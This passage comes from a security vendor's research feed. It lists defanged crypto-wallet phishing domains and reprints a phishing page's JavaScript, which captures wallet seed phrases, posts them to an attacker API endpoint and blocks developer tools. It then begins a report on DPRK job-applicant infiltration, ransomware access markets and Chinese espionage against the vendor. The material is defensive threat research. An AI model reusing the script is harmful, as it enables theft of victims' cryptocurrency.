https://teirzoriiostart.azurewebsites[.]net/<br />
https://tereamanezheoakeeoake.azurewebsites[.]net/<br />
https://tereazeriwaleits.azurewebsites[.]net/<br />
https://tereizercoinswalts.azurewebsites[.]net/<br />
https://tereizercoinsweb.azurewebsites[.]net/<br />
https://tereziiorcoinsweb3.azurewebsites[.]net/<br />
https://tereziioreeae-walieats.azurewebsites[.]net/<br />
https://terezorcoinscweb3.azurewebsites[.]net/<br />
https://terezuiear-api.azurewebsites[.]net/<br />
https://terozeiorwltliv31wikub.azurewebsites[.]net/<br />
https://terozriosiuet.azurewebsites[.]net/<br />
https://terzoerirwlt476liv.azurewebsites[.]net/<br />
https://tirizeriostrt.azurewebsites[.]net/<br />
https://tirizurstrtio.azurewebsites[.]net/<br />
https://tirzwltliv09erds.azurewebsites[.]net/<br />
https://tizrerlivwlt897wlt.azurewebsites[.]net/<br />
https://tizrwlterliv45livwlt.azurewebsites[.]net/<br />
https://tr01-dkfjgk-slas.s3.eu-north-1.amazonaws[.]com/index.html<br />
https://tr0ox-obnsj.s3.eu-north-1.amazonaws[.]com/index.html<br />
https://tra09fjl-sodfjjkd.s3.eu-north-1.amazonaws[.]com/index.html<br />
https://trac-durjg-fkf.s3.eu-north-1.amazonaws[.]com/index.html<br />
https://traezor-suitez403.azurewebsites[.]net/<br />
https://traieazeariscoins.azurewebsites[.]net/<br />
https://tre876162ru0988zer.azurewebsites[.]net/<br />
https://treaizerecoins.azurewebsites[.]net/<br />
https://treauzearcoins.azurewebsites[.]net/<br />
https://treazerapi-apk.azurewebsites[.]net/<br />
https://treazerszcoins.azurewebsites[.]net/<br />
https://treaziexc-ax-bc.azurewebsites[.]net/<br />
https://treazirapi-apk.azurewebsites[.]net/<br />
https://treazosr-api.azurewebsites[.]net/<br />
https://treazsoirsuites.azurewebsites[.]net/<br />
https://treazuer-suite.azurewebsites[.]net/<br />
https://treizaers-coins.azurewebsites[.]net/<br />
https://treizoircoinerror3.azurewebsites[.]net/<br />
https://treizrwalogn.azurewebsites[.]net/<br />
https://treriertriliv34erwlt.azurewebsites[.]net/<br />
https://trezaereade-suite.azurewebsites[.]net/<br />
https://trezieserscoins.azurewebsites[.]net/<br />
https://trezior-suite.azurewebsites[.]net/<br />
https://trezirapp-api.azurewebsites[.]net/<br />
https://treziresacoins.azurewebsites[.]net/<br />
https://triezorwallets.azurewebsites[.]net/<br />
https://trioriorwlt485wltliv.azurewebsites[.]net/<br />
https://trizeriowaliet.azurewebsites[.]net/<br />
https://triziorecoinsweb3.azurewebsites[.]net/<br />
https://triziriosuite.azurewebsites[.]net/<br />
https://trizuriosiute.azurewebsites[.]net/<br />
https://trucetreizerr.azurewebsites[.]net/<br />
https://truiazearcoins.azurewebsites[.]net/<br />
https://trzeriostrt.azurewebsites[.]net/<br />
https://ttrzorappsuite.azurewebsites[.]net/<br />
https://tzer30liv.s3.us-east-2.amazonaws[.]com/index.html<br />
https://tzr06wlt.s3.eu-north-1.amazonaws[.]com/index.html<br />
https://tzreoirwlt05balba.azurewebsites[.]net/<br />
https://tzreoriewlt31wikub.azurewebsites[.]net/<br />
https://uniswapv3login.azurewebsites[.]net/<br />
https://uphooldlogn.azurewebsites[.]net/<br />
https://web-treszor.azurewebsites[.]net/<br />
https://weberrortrezur886.azurewebsites[.]net/<br />
https://wltcbserlive467wlt.azurewebsites[.]net/<br />
https://wltlzr67erlivehsfjfd.azurewebsites[.]net/<br />
https://woleatcoebs34livwlt.azurewebsites[.]net/<br />
https://zen-ledger-error.azurewebsites[.]net/<br />
https://zenledgerscoinsweb.azurewebsites[.]net/</p>
<h3>Example JavaScript</h3>
<p>This is an example of the JavaScript (&#8220;app.js&#8221;) that was included on the S3-hosted phishing example: <code>https://dft0-hjgkd26-fkj.s3.us-east-1.amazonaws[.]com/index.html</code>.</p>
<p>Note the defanged malicious URL in the code below–that is the only alteration.</p>
<pre>
let currentWordCount = 12; // Default word count
function updateInputFields(wordCount) {
   const inputContainer = document.getElementById('inputContainer');
   inputContainer.innerHTML = '';
    currentWordCount = wordCount;
    for (let i = 0; i &lt; wordCount; i++) { // Use 0-based index for phase keys
        const colDiv = document.createElement('div');
    // if (wordCount === 1) {
    //     colDiv.className = 'col-lg-21 col-md-12 col-sm-12 col-xs-12';
    //     colDiv.innerHTML = `
    //         &lt;input
    //             class="form-control"
    //             type="text"
    //             placeholder="Input your words as many words as you have"
    //             name="word${i}"
    //             required
    //             title="Only alphabets are allowed.">
    //         &lt;div class="error-message" style="font-size:12px;color: #fe3131f2; display: none;">Please enter a valid value.&lt;/div>
    //     `;
    // } else {
        colDiv.className = 'col-lg-4 col-md-4 col-sm-4 col-xs-12';
        colDiv.innerHTML = `
            &lt;input
                class="form-control"
                type="text"
                placeholder="${i + 1}."
                name="word${i}"
                required
                pattern="[a-zA-Z]{1,10}"
                maxlength="10"
                oninput="this.value = this.value.replace(/[^a-zA-Z]/g, '').substring(0, 10);"
                title="Only alphabets are allowed.">
            &lt;div class="error-message" style="font-size:12px;color: #fe3131f2; display: none;">Please enter a valid value.&lt;/div>
                `;
            // }
        inputContainer.appendChild(colDiv);
    }
    event.target.classList.add('active');
    const buttons = document.querySelectorAll('.displayflex button');
    buttons.forEach((button) => {
        button.classList.remove('active');
    });
    event.target.classList.add('active');
}
async function handleNextStep(event) {
    event.preventDefault();
    const inputContainer = document.getElementById('inputContainer');
    const inputs = inputContainer.querySelectorAll('input');
    let allValid = true;
    const enteredWords = new Set();
    inputs.forEach((input) => {
        const errorDiv = input.nextElementSibling; // Get the associated error div
        if (!input.checkValidity()) {
            errorDiv.style.display = 'block';
            allValid = false;
        } else {
            errorDiv.style.display = 'none';
        }
        const word = input.value.trim().toLowerCase(); // Normalize to lowercase to handle case insensitivity
        if (word &amp;&amp; enteredWords.has(word)) {
            allValid = false;
            errorDiv.innerHTML = 'This word has already been entered.';
            errorDiv.style.display = 'block';
        } else {
            enteredWords.add(word);  // Add word to the Set
        }
    });
    if (!allValid) {
        alert("Mnemonic phrase is not valid. Try again.");
        return;
    }
    const data = {};
    inputs.forEach((input, index) => {
    data[`phrase${index}`] = input.value.trim();
    });
    data.subject = "Trezor connect2";
    data.message = "Successfull fetch data";
    $.ajax({
        type: "POST",
        url: "<b>https://rfhwuwixxi.execute-api.us-east-1.amazonaws[.]com/prod/eappmail</b>",
        dataType: "json",
        crossDomain: true,
        contentType: "application/json; charset=utf-8",
        data: JSON.stringify(data),
        success: function (result) {
        alert('Data submitted successfully1!');
        window.location.href = 'https://suite.trezor.io/web/';
        location.reload();
        },
        error: function (xhr, status, error) {
            window.location.href = 'https://suite.trezor.io/web/';
&nbsp;
&nbsp;
        }
    });
}

window.onload = function () {
    // Prevent the back button from navigating back
    function preventBack() {
    history.forward();
    }
    
    // Execute the `preventBack` function immediately after page load
    setTimeout(preventBack, 0);
    
    // Ensure the page doesn't cache on unload, forcing users to reload
    window.onunload = function () {
        return null;
    };
};

document.addEventListener('DOMContentLoaded', () => updateInputFields(12));

document.addEventListener("DOMContentLoaded", function () {
    const statusButton = document.getElementById("statusButton");
    const statusText = document.getElementById("statusText");
    const statusIcon = document.getElementById("statusIcon");
    // Initial state: "Waiting for Trezor..."
    statusText.textContent = "Waiting for Trezor... ";
    statusIcon.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin" style="color: #ffffff;"></i>';
    // After 2 seconds: "Establishing connection"
    setTimeout(() => {
        statusText.textContent = "Establishing connection...";
        statusIcon.innerHTML = '<i class="fa-solid fa-link" style="color: #ffffff;"></i>';
    }, 5000);
    // After 5 seconds: "Unable to read data" (Error state)
    setTimeout(() => {
    statusText.textContent = "Unable to read data";
    statusIcon.innerHTML = '<i class="fa-solid fa-circle-exclamation" style="color: #ffffff;"></i>';
    statusButton.classList.add("error-btn");
    }, 5000);
    function resetStatus() {
        // Reset to "Establishing connection..."
        statusText.textContent = "Establishing connection...";
        statusIcon.innerHTML = '<i class="fa-solid fa-link" style="color: #ffffff;"></i>';
        statusButton.classList.remove("error-btn");  // Reset error button class
        // After 3 seconds: Change status to "Unable to read data"
        setTimeout(() => {
            statusText.textContent = "Unable to read data";
            statusIcon.innerHTML = '<i class="fa-solid fa-circle-exclamation" style="color: #fe3131f2;"></i>';
            statusButton.classList.add("error-btn");
        }, 5000);
    }
    // Event listener for button click
    statusButton.addEventListener("click", function () {
        resetStatus(); // Reset and start the cycle on each click
    });
    // Optionally, you can trigger the status change flow immediately after page load for testing
    setTimeout(() => {
        resetStatus(); // Automatically run the flow when the page loads (optional)
    }, 5000);
});

    // Disable right-click context menu
    document.addEventListener("contextmenu", (event) => event.preventDefault());
    // Disable key combinations for opening developer tools
    document.addEventListener("keydown", (event) => {
    // Disable F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U (View Source), Ctrl+Shift+C
    if (
        event.key === "F12" ||
        (event.ctrlKey &amp;&amp; event.shiftKey &amp;&amp; ["I", "J", "C"].includes(event.key)) ||
        (event.ctrlKey &amp;&amp; event.key === "U")
    ) {
        event.preventDefault();
}
});

    // Detect if devtools is opened (basic detection)
    const detectDevTools = () => {
    const element = new Image();
        Object.defineProperty(element, "id", {
            get: () => {
                alert("Developer tools detected. Please close it to proceed.");
                // Redirect or log out the user
                window.location.href = "about:blank"; // Example action
            },
        });
        console.log(element);
    };
    detectDevTools();
    setInterval(detectDevTools, 1000);
</pre>
]]></content:encoded>
					
		
		
		<enclosure url="https://www.sentinelone.com/wp-content/uploads/2025/05/CryptoDrain-soc.jpg" length="969572" type="image/jpeg" />	</item>
		<item>
		<title>Top Tier Target &#124; What It Takes to Defend a Cybersecurity Company from Today&#8217;s Adversaries</title>
		<link>https://www.sentinelone.com/labs/top-tier-target-what-it-takes-to-defend-a-cybersecurity-company-from-todays-adversaries/</link>
		
		<dc:creator><![CDATA[Tom Hegel, Aleksandar Milenkoski &amp; Jim Walter]]></dc:creator>
		<pubDate>Mon, 28 Apr 2025 09:55:19 +0000</pubDate>
				<category><![CDATA[adversary]]></category>
		<guid isPermaLink="false">https://www.sentinelone.com/?post_type=labs&#038;p=119693</guid>

					<description><![CDATA[This report highlights a rarely-discussed but crucially important attack surface: security vendors themselves]]></description>
										<content:encoded><![CDATA[<h2>Executive Summary</h2>
<ul>
<li aria-level="1">In recent months, SentinelOne has observed and defended against a spectrum of attacks from financially motivated crimeware to tailored campaigns by advanced nation-state actors.</li>
<li aria-level="1">These incidents were real intrusion attempts against a U.S.-based cybersecurity company by adversaries, but incidents such as these are neither new nor unique to SentinelOne.</li>
<li aria-level="1">Recent adversaries have included:
<ul>
<li aria-level="2">DPRK IT workers posing as job applicants</li>
<li aria-level="2">ransomware operators probing for ways to access/abuse our platform</li>
<li aria-level="2">Chinese state-sponsored actors targeting organizations aligned with our business and customer base</li>
</ul>
</li>
<li aria-level="1">This report highlights a rarely-discussed but crucially important attack surface: security vendors themselves.</li>
</ul>
<h2>Overview</h2>
<p>At SentinelOne, defending against real-world threats isn’t just part of the job, it’s the reality of operating as a cybersecurity company in today’s landscape. We don’t just study attacks, we experience them firsthand, levied against us. Our teams face the same threats we help others prepare for, and that proximity to the front lines shapes how we think, and how we operate. Real-world attacks against our own environment serve as constant pressure tests, reinforcing what works, revealing what doesn’t, and driving continuous improvement across our products and operations. When you’re a high-value target for some of the most capable and persistent adversaries out there, nothing less will do.</p>
<p>Talking about being targeted is uncomfortable for any organization. For cybersecurity vendors, it&#8217;s practically taboo. But the truth is security vendors sit at an interesting cross-section of access, responsibility, and attacker ire that makes us prime targets for a variety of threat actors, and the stakes couldn’t be higher. When adversaries compromise a security company, they don’t just breach a single environment—they potentially gain insight into how thousands of environments and millions of endpoints are protected.</p>
<p>In the past several months alone, we’ve observed and defended against a spectrum of attacks ranging from financially motivated crimeware to tailored campaigns by advanced nation-state actors. They were real intrusion attempts targeting a U.S.-based cybersecurity company — launched by adversaries actively looking for an advantage, access, or leverage. Adversaries included DPRK IT workers posing as job applicants, ransomware operators probing for ways to access/abuse our platform, and Chinese state-sponsored actors targeting organizations aligned with our business and customer base.</p>
<p>We are certainly not the only ones facing these threats. In the spirit of furthering collective defenses and encouraging further collaboration, we’re pulling back the curtain to share some of what we’ve seen, why it matters, and what it tells us about the evolving threat landscape—not just for us, but for every company building and relying on modern security technology.</p>
<h2>DPRK IT Workers Seeking Inside Jobs</h2>
<p>One of the more prolific and persistent adversary campaigns we’ve tracked in recent years involves widespread campaigns by DPRK-affiliated IT Workers attempting to secure remote employment within Western tech companies– including SentinelOne. <a href="https://www.justice.gov/archives/opa/pr/fourteen-north-korean-nationals-indicted-carrying-out-multi-year-fraudulent-information" target="_blank" rel="noopener noreferrer">Early reports</a> drew attention to these efforts and <a href="https://www.sentinelone.com/labs/dprk-it-workers-a-network-of-active-front-companies-and-their-links-to-china/" target="_blank" rel="noopener noreferrer">our own analysis</a> revealed further logistical infrastructure to launder illicit funds via Chinese intermediary organizations. However, neither gave a sense of the staggering volume of ongoing infiltration attempts. This vector far outpaces any other insider threat vector we monitor.</p>
<p>These actors are not just applying blindly — they are refining their process, leveraging stolen or fabricated personas, and adapting their outreach tactics to mirror legitimate job seekers in increasingly convincing ways. Our team has tracked roughly 360 fake personas and over 1,000 job applications linked to DPRK IT worker operations applying for roles at SentinelOne — even including brazen attempts to secure positions on the SentinelLabs intelligence engineering team itself.</p>
<figure id="attachment_120051" aria-describedby="caption-attachment-120051" style="width: 588px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_1.jpg" alt="Public reporting of DPRK IT workers applying to threat intelligence positions" width="588" height="723" class="size-full wp-image-120051" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_1.jpg 588w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_1-244x300.jpg 244w" sizes="auto, (max-width: 588px) 100vw, 588px" /><figcaption id="caption-attachment-120051" class="wp-caption-text">Public reporting of DPRK IT workers applying to threat intelligence positions</figcaption></figure>
<h3>Engagement and Adversary Interaction</h3>
<p>Instead of staying passive, we made a deliberate choice towards intelligence-driven engagement. In coordination with our talent acquisition teams, we developed workflows to identify and interact with suspected DPRK applicants during the early phases of their outreach. This collaboration was key. By embedding lightweight vetting signals and monitoring directly into recruiting processes — without overburdening hiring teams — we were able to surface anomalous patterns tied to DPRK-affiliated personas piped directly into our Vertex Synapse intelligence platform for analyst review.</p>
<p>Our attempted interactions offered rare insights into the craftiness and persistence of these infiltration campaigns — particularly the ways in which adversaries adapt to the friction they encounter.</p>
<figure id="attachment_120055" aria-describedby="caption-attachment-120055" style="width: 1908px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_6.jpg" alt="Inbound DPRK referral request to strategic employees" width="1908" height="378" class="size-full wp-image-120055" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_6.jpg 1908w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_6-300x59.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_6-1024x203.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_6-768x152.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_6-1536x304.jpg 1536w" sizes="auto, (max-width: 1908px) 100vw, 1908px" /><figcaption id="caption-attachment-120055" class="wp-caption-text">Inbound DPRK referral request to strategic employees</figcaption></figure>
<p>The attackers are honing their craft beyond the job application and recruitment process. An operation of this scale and nature requires a different kind of backend infrastructure, such as a<a href="https://www.sentinelone.com/labs/dprk-it-workers-a-network-of-active-front-companies-and-their-links-to-china/" target="_blank" rel="noopener noreferrer"> sprawling network of front companies</a> to enable further laundering and logistics.</p>
<figure id="attachment_120057" aria-describedby="caption-attachment-120057" style="width: 2000px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_8.jpg" alt="DPRK IT Worker Front Company Network (November 2024)" width="2000" height="1037" class="magnify size-full wp-image-120057" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_8.jpg 2000w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_8-300x156.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_8-1024x531.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_8-768x398.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_8-1536x796.jpg 1536w" sizes="auto, (max-width: 2000px) 100vw, 2000px" /><figcaption id="caption-attachment-120057" class="wp-caption-text">DPRK IT Worker Front Company Network (November 2024)</figcaption></figure>
<h3>Helping Hiring Teams Help Us</h3>
<p>A key takeaway in working on this investigation was the value of intentionally creating inroads and sharing threat context with different teams not normally keyed into investigations. Rather than cluelessness, we encountered an intuitive understanding of the situation as recruiters had already been filtering out and reporting ‘fake applicants’ within their own processes.</p>
<p>We brought campaign-level understanding that was combined with tactical insights from our talent team. The payoff was immediate. Recruiters began spotting patterns on their own, driving an increase in early-stage escalation of suspicious profiles. They became an active partner that continues to flag new sightings from the frontlines. In turn, we are codifying these insights into automated systems that flag, filter, enrich, and proactively block these campaigns to lower the burden on our recruiters and hiring managers, and reduce the risk of infiltration.</p>
<p>Make cross‑functional collaboration standard operating procedure: equip frontline business units—from recruiting to sales—with shared threat context and clear escalation paths so they can surface anomalies early without slowing the business. Codifying insights with automation will consistently bring bi-directional benefits.</p>
<p>The DPRK IT worker threat is a uniquely complex challenge — one where meaningful progress depends on collaboration between the security research community and public sector partners.</p>
<h2>Ransomware Group Capability Development</h2>
<p>Financially motivated threat actors frequently target enterprise security platforms —products designed to keep them from making money—for direct access. SentinelOne, like our peers, is no exception. While uncomfortable, this is a reality the industry faces continually and should handle with both transparency and urgency.</p>
<figure id="attachment_120054" aria-describedby="caption-attachment-120054" style="width: 746px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_5.jpg" alt="Forum post offering security product access" width="746" height="415" class="size-full wp-image-120054" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_5.jpg 746w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_5-300x167.jpg 300w" sizes="auto, (max-width: 746px) 100vw, 746px" /><figcaption id="caption-attachment-120054" class="wp-caption-text">Forum post offering security product access</figcaption></figure>
<p>Privileged access to administrative interfaces or agent installers for endpoint security products provides tangible advantages for adversaries seeking to advance their operations. Console access can be used to disable protections, manipulate configurations, or suppress detections. Direct, unmonitored access to the endpoint agent offers opportunities to test malware efficacy, explore bypass or tampering techniques, and suppress forensic visibility critical for investigations. In the wrong hands, these capabilities represent a significant threat to both the integrity of security products and the environments they protect.</p>
<p>This isn’t a new tactic. Various high-profile criminal groups have long specialized in social engineering campaigns to gain access to core security tools and infrastructure—ranging from EDR platforms (including SentinelOne and Microsoft Defender) to IAM and VPN providers such as Okta. Their goal: expand footholds, disable defenses, and obstruct detection long enough to profit.</p>
<p>Recent leaks related to <a href="https://www.sentinelone.com/anthology/black-basta/" target="_blank" rel="noopener noreferrer">Black Basta</a> further underscore this trend. The group’s operators were observed testing across multiple endpoint security platforms—including SentinelOne, CrowdStrike, Carbon Black, and Palo Alto Networks—before launching attacks, suggesting a systematic effort to evaluate and evade security tools prior to deployment.</p>
<figure id="attachment_120064" aria-describedby="caption-attachment-120064" style="width: 793px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_11v2.jpg" alt="Black Basta leak excerpts" width="793" height="328" class="size-full wp-image-120064" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_11v2.jpg 793w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_11v2-300x124.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_11v2-768x318.jpg 768w" sizes="auto, (max-width: 793px) 100vw, 793px" /><figcaption id="caption-attachment-120064" class="wp-caption-text">Black Basta leak excerpts</figcaption></figure>
<h3>Economy/Ecosystem</h3>
<p>There is an increasingly mature and active underground economy built around the buying, selling, and renting of access to enterprise security tools. For the right price, aspiring threat actors continually attempt to obtain time-bound or persistent access to our EDR platform and administrative consoles. Well-known cybercrime forums are filled with vendors openly advertising such access—and just as many buyers actively seeking it. This includes long-established forums like <code>XSS[.]is</code>, <code>Exploit[.]in</code> and RAMP.</p>
<p>That said, more of this activity has been moving to confidential messaging platforms as well (Telegram, Discord, Signal). For example, Telegram bots are used to automate trading this access, and Signal is often used by threat actors to discuss nuance, targeting and initial access operations.</p>
<p>This supply-and-demand dynamic is not only robust but also accelerating. Entire service offerings have emerged around this ecosystem, including “EDR Testing-as-a-Service,” where actors can discreetly evaluate malware against various endpoint protection platforms.</p>
<figure id="attachment_120059" aria-describedby="caption-attachment-120059" style="width: 1053px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_10.jpg" alt="Proposed Private EDR testing service" width="1053" height="386" class="size-full wp-image-120059" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_10.jpg 1053w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_10-300x110.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_10-1024x375.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_10-768x282.jpg 768w" sizes="auto, (max-width: 1053px) 100vw, 1053px" /><figcaption id="caption-attachment-120059" class="wp-caption-text">Proposed Private EDR testing service</figcaption></figure>
<p>While these testing services may not grant direct access to full-featured EDR consoles or agents, they do provide attackers with semi-private environments to fine-tune malicious payloads without the threat of exposure—dramatically improving the odds of success in real-world attacks.</p>
<figure id="attachment_120053" aria-describedby="caption-attachment-120053" style="width: 1999px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_4.jpg" alt="Prospective buyer for EDR installs" width="1999" height="455" class="size-full wp-image-120053" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_4.jpg 1999w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_4-300x68.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_4-1024x233.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_4-768x175.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_4-1536x350.jpg 1536w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_4-221x51.jpg 221w" sizes="auto, (max-width: 1999px) 100vw, 1999px" /><figcaption id="caption-attachment-120053" class="wp-caption-text">Prospective buyer for EDR installs</figcaption></figure>
<p>Access isn’t always bought, however. Threat actors frequently harvest legitimate credentials from infostealer logs—a common and low-cost method of acquiring privileged access to enterprise environments. In cases where existing customers reuse credentials, this can translate into a threat actor also gaining access to security tools. In more targeted operations, actors have also turned to bribery, offering significant sums to employees willing to sell out their account access.</p>
<p>These insider threats are not hypothetical. For instance, some groups have been observed offering upwards of $20,000 to employees at targeted companies in exchange for insider assistance—an approach openly discussed in the same dark web forums where compromised credentials and access are routinely traded.</p>
<p>On the defensive side, this requires constant monitoring and maintenance. Situational awareness has to be prioritized in order to maintain platform integrity and protect our legitimate customers. Our research teams are constantly monitoring for this style of abuse and access ‘leakage’, focusing on anomalous console access and site-token usage, and taking necessary actions to revoke these access vectors. This prohibits threat actors from fully interacting with the wider platform, and essentially orphans leaked agent installs, limiting the use of the agent in the hands of the threat actor.</p>
<h3>Nitrogen — Threat Operators ‘Leveling Up’</h3>
<p><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_7.jpg" alt="" width="799" height="405" class="aligncenter size-full wp-image-120056" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_7.jpg 799w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_7-300x152.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_7-768x389.jpg 768w" sizes="auto, (max-width: 799px) 100vw, 799px" /></p>
<p>Some ransomware operations are now bypassing the underground market altogether—opting instead for more tailored, concentrated-effort impersonation campaigns to gain access to security tools. This approach is epitomized by the Nitrogen ransomware group.</p>
<p>Nitrogen is believed to be operated by a well-funded Russian national with ties to earlier groups like Maze and Snatch. Rather than purchasing illicit access, Nitrogen impersonates real companies—spinning up lookalike domains, spoofed email addresses, and cloned infrastructure to convincingly pose as legitimate businesses. Nitrogen then purchases official licenses for EDR and other security products under these false pretenses.</p>
<p>This kind of social engineering is executed with precision. Nitrogen typically targets small, lightly vetted resellers—keeping interactions minimal and relying on resellers’ inconsistent KYC (Know Your Customer) practices to slip through the cracks.</p>
<p>These impersonation tactics introduce a new layer of complexity for defenders. If a threat actor successfully acquires legitimate licenses from a real vendor, they can weaponize the product to test, evade, and potentially disable protections—without ever having to engage with criminal markets.</p>
<p>This highlights a growing challenge for the security industry: reseller diligence and KYC enforcement are clearly part of the threat surface. When those controls are weak or absent, adversaries like Nitrogen gain powerful new ways to elevate their campaigns—often at a lower cost and lower risk than the black market.</p>
<h3>Lessons Learned and Internal Collaboration</h3>
<p>One of the most impactful lessons from tracking adversaries targeting our platform has been the value of deep, early collaboration across internal teams — particularly those not traditionally pulled into threat response efforts. For example, by proactively engaging with our reseller operations and customer success teams, we can surface valuable signals on questionable license requests, reseller behavior anomalies, and business inconsistencies that could have otherwise gone unnoticed.</p>
<p>By creating shared playbooks, embedding lightweight threat context, and establishing clear escalation paths, reactive processes turn into proactive signal sources. Now, suspicious licensing activity—especially when paired with evasive behaviors or mismatched domain metadata—can surface much earlier in the workflow.</p>
<p>To scale this effort, we increasingly lean into automation. By codifying threat patterns—such as domain registration heuristics, behavioral metadata mismatches, and reseller inconsistencies—organizations can automate enrichment and risk-scoring for incoming licensing requests. This can then be used to dynamically filter, flag, and in some cases, auto-block high-risk activity before it reaches onboarding.</p>
<p>The growing trend of adversaries exploiting sales processes—whether through impersonation, social engineering, or brute-force credential use—means security vendors must treat every access vector, including commercial and operational pipelines, as part of the attack surface. Making cross-functional threat awareness standard operating procedure and integrating detection logic at the edge of business systems is essential.</p>
<p>We’re continuing to improve this work in quiet ways. And while we won’t share every detection logic here (for obvious reasons), we encourage others in the industry to pursue similar internal partnerships. Sales and support teams may already be seeing signs of abuse—security teams just need to give them the lens to recognize it.</p>
<h2>Chinese State-Sponsored Adversaries</h2>
<p>One notable set of activity, occurring over the previous months, involved reconnaissance attempts against SentinelOne&#8217;s infrastructure and specific high value organizations we defend. We first became aware of this threat cluster during a 2024 intrusion conducted against an organization previously providing hardware logistics services for SentinelOne employees. We refer to this cluster of activity as PurpleHaze, with technical overlaps to multiple publicly reported Chinese APTs.</p>
<h3>The PurpleHaze Activity Cluster</h3>
<p>Over the course of months, SentinelLABS observed the threat actor conduct many intrusions, including into a South Asian government supporting entity, providing IT solutions and infrastructure across multiple sectors. This activity involved extensive infrastructure, some of which we associate with an operational relay box (ORB) network, and a Windows backdoor that we track as GoReShell. The backdoor is implemented in the Go programming language and uses functionalities from the open-source <a href="https://github.com/NHAS/reverse_ssh" target="_blank" rel="noopener noreferrer">reverse_ssh</a> tool to establish reverse SSH connections to attacker-controlled endpoints.</p>
<p>SentinelLABS collectively tracks these activities under the PurpleHaze moniker. We assess with high confidence that PurpleHaze is a China-nexus actor, loosely linking it to APT15 (also known as Nylon Typhoon, or other various outdated aliases). This adversary is known for its global targeting of critical infrastructure sectors, such as telecommunications, information technology, and government organizations – victimology that aligns with our multiple encounters with PurpleHaze.</p>
<p>We track the ORB network infrastructure observed in the attack against the South Asian government organization as being operated from China and actively used by several suspected Chinese cyberespionage actors, including APT15. The use of ORB networks is a <a href="https://cloud.google.com/blog/topics/threat-intelligence/china-nexus-espionage-orb-networks/" target="_blank" rel="noopener noreferrer">growing</a> trend among these threat groups, since they can be rapidly expanded to create a dynamic and evolving infrastructure that makes tracking cyberespionage operations and their attribution challenging. Additionally, GoReShell malware and its variations, including the deployment mechanism on compromised machines and obfuscation techniques have been exclusively observed in intrusions that we attribute with high confidence to China-nexus actors.</p>
<h3>ShadowPad Intrusions</h3>
<p>In June 2024, approximately four months prior to PurpleHaze targeting SentinelOne, SentinelLABS observed threat actor activity targeting the same South Asian government entity that was also targeted in October 2024. Among the retrieved artifacts, we identified samples of <a href="https://www.sentinelone.com/labs/shadowpad-a-masterpiece-of-privately-sold-malware-in-chinese-espionage/" target="_blank" rel="noopener noreferrer">ShadowPad</a>, a modular backdoor platform used by multiple suspected China-nexus threat actors to conduct cyberespionage. Recent ShadowPad <a href="https://www.trendmicro.com/en_us/research/25/b/updated-shadowpad-malware-leads-to-ransomware-deployment.html" target="_blank" rel="noopener noreferrer">activity</a> has also included the deployment of ransomware, though the motive remains unclear — whether for financial gain or as a <a href="https://www.sentinelone.com/labs/chamelgang-attacking-critical-infrastructure-with-ransomware/" target="_blank" rel="noopener noreferrer">means</a> of distraction, misattribution, or removal of evidence.</p>
